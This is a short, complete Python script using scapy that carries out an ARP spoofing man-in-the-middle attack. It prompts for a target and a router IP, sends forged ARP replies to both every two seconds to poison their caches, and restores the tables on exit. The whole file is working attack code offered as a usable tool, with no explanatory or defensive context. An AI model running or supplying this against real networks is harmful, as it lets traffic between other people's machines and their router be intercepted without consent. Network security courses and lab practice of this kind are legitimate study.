import time
import scapy.all as scapy

# Get user inputs for target and router IPs
target_ip = str(input("Please enter the target machine's IP: "))
router_ip = str(input("Please enter the router's IP: "))

def get_mac(ip):
    """Get the MAC address for a given IP address using ARP."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    """Send spoofed ARP responses to the target IP."""
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(target_ip, router_ip):
    """Restore the original ARP tables of the target and router."""
    destination_mac = get_mac(target_ip)
    source_mac = get_mac(router_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=destination_mac, psrc=router_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Sent packets: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nQuitting the program...")
    restore(target_ip, router_ip)
